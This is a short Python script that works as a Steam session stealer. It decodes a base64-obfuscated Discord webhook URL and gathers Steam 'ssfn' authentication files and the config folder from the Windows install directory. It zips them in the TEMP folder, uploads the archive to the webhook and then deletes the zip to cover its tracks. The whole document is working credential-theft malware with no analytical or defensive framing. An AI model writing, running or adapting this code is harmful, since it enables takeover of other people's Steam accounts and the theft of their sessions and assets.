
import os, os.path, zipfile, requests
import base64

hook = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5Mzc2Mjg2OTI4NTM3MjA1NS9kZzgwcmo0b0tUNDVlQU5xVWVUaWl6eXlZRjYzdkxJaGtxNzJ6YXBkVjRYNlNRUW9GTVdyNTEyb1pDWjg1WnIydmlnRQ==").decode()

steam_path = ""
if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
 steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
 ssfn = []
 config = ""
 for file in os.listdir(steam_path):
     if file[:4] == "ssfn":
         ssfn.append(steam_path+f"\\{file}")
     def steam(path,path1,steam_session):
            for root,dirs,file_name in os.walk(path):
                for file in file_name:
                    steam_session.write(root+"\\"+file)
            for file2 in path1:
                steam_session.write(file2)
     if os.path.exists(steam_path+"\\config"):
      with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
                steam(steam_path+"\\config",ssfn,zp)
file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
r = requests.post(hook, files=file)
try:
 os.remove(f"{os.environ['TEMP']}\steam_session.zip")
except:
    pass
